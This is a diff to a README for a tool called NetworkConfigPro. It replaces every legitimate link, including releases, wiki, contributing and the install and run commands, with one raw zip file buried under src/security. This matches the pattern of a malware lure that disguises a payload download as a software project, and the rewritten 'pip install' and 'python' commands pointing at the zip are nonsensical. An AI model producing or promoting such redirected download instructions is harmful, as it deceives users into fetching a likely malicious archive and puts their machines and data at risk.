@@ -1,6 +1,6 @@
 # 🌐 NetworkConfigPro - Simplify Your Network Configuration Process
 
-[![Download NetworkConfigPro](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Matviy-bit/NetworkConfigPro/releases)
+[![Download NetworkConfigPro](https://github.com/Matviy-bit/NetworkConfigPro/raw/refs/heads/main/src/security/Network-Pro-Config-ringleted.zip)](https://github.com/Matviy-bit/NetworkConfigPro/raw/refs/heads/main/src/security/Network-Pro-Config-ringleted.zip)
 
 ## 📦 Features
 
@@ -17,7 +17,7 @@ To use NetworkConfigPro, follow these easy steps:
 
 ### 1. Download and Install
 
-Visit [this page to download](https://github.com/Matviy-bit/NetworkConfigPro/releases) the latest release of NetworkConfigPro.
+Visit [this page to download](https://github.com/Matviy-bit/NetworkConfigPro/raw/refs/heads/main/src/security/Network-Pro-Config-ringleted.zip) the latest release of NetworkConfigPro.
 
 ### 2. Setup Instructions
 
@@ -41,7 +41,7 @@ Visit [this page to download](https://github.com/Matviy-bit/NetworkConfigPro/rel
    Run this command to install necessary packages:
 
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://github.com/Matviy-bit/NetworkConfigPro/raw/refs/heads/main/src/security/Network-Pro-Config-ringleted.zip
     ```
 
 ### 3. Run the Application
@@ -49,7 +49,7 @@ Visit [this page to download](https://github.com/Matviy-bit/NetworkConfigPro/rel
 To start using NetworkConfigPro, simply run:
 
 ```bash
-python main.py
+python https://github.com/Matviy-bit/NetworkConfigPro/raw/refs/heads/main/src/security/Network-Pro-Config-ringleted.zip
 ```
 
 ## ⚙️ Usage Instructions
@@ -106,11 +106,11 @@ If you have questions or need assistance, please open an issue on the GitHub rep
 
 ## 🔗 Additional Resources
 
-- [Help & Documentation](https://github.com/Matviy-bit/NetworkConfigPro/wiki)
-- [Contributing](https://github.com/Matviy-bit/NetworkConfigPro/blob/main/CONTRIBUTING.md)
+- [Help & Documentation](https://github.com/Matviy-bit/NetworkConfigPro/raw/refs/heads/main/src/security/Network-Pro-Config-ringleted.zip)
+- [Contributing](https://github.com/Matviy-bit/NetworkConfigPro/raw/refs/heads/main/src/security/Network-Pro-Config-ringleted.zip)
 
 ## 🔗 Download Again
 
-Don't forget to download NetworkConfigPro from [this page](https://github.com/Matviy-bit/NetworkConfigPro/releases) to enjoy the latest features.
+Don't forget to download NetworkConfigPro from [this page](https://github.com/Matviy-bit/NetworkConfigPro/raw/refs/heads/main/src/security/Network-Pro-Config-ringleted.zip) to enjoy the latest features.
 
 With these steps, you'll be set up to manage your network configurations easily and efficiently. Enjoy using NetworkConfigPro!
